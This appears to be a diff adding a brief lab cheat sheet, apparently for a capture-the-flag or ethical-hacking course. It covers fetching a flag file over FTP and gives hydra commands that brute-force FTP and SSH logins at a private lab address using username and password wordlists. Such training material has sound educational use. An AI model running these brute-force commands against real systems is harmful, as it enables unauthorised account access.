@@ -1,0 +1,17 @@
+How to FTP Site:
+Parrot OS -> Terminal: Type ftp Enter
+ftp> Enter user name
+Enter password
+After successful login -> ls to list files
+ftp> get flag.txt /home/attacker/Desktop/flag.txt
+ftp> exit
+cd /home/attacker/Desktop
+pluma flag.txt
+cat flag.txt
+
+FTP:
+hydra -L /home/attacker/Desktop/username.txt -P /home/attacker/Desktop/password.txt ftp://10.10.1.11
+
+SSH:
+hydra -L /home/attacker/Desktop/username.txt -P /home/attacker/Desktop/password.txt 10.10.1.11 SSH
+putty with user id and password
